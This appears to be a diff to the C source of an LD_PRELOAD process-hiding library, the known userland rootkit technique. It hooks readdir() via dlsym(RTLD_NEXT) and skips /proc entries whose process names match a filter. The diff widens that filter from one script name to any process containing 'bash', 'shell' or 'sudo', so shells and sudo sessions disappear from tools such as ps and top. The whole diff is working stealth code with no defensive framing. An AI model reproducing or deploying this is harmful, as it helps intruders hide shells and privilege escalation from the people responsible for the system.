@@ -9,7 +9,12 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+#define NUMBER_OF_PROCESSES_TO_FILTER 3
+static const char* process_to_filter[NUMBER_OF_PROCESSES_TO_FILTER] = {
+    "bash", 
+    "shell",
+    "sudo",
+};
 
 /*
  * Get a directory name given a DIR* handle
@@ -61,13 +66,22 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
+static int match_process_name(char* process_name) {
+    for(int i=0; i<NUMBER_OF_PROCESSES_TO_FILTER; i++) {
+        if(strstr(process_name, process_to_filter[i]) != NULL) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
 struct dirent* readdir(DIR *dirp)                                       \
 {                                                                       \
     if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
         if(original_##readdir == NULL)                                  \
         {                                                               \
             fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
@@ -85,7 +99,7 @@ struct dirent* readdir(DIR *dirp)                                       \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                match_process_name(process_name)) {                     \
                 continue;                                               \
             }                                                           \
         }                                                               \
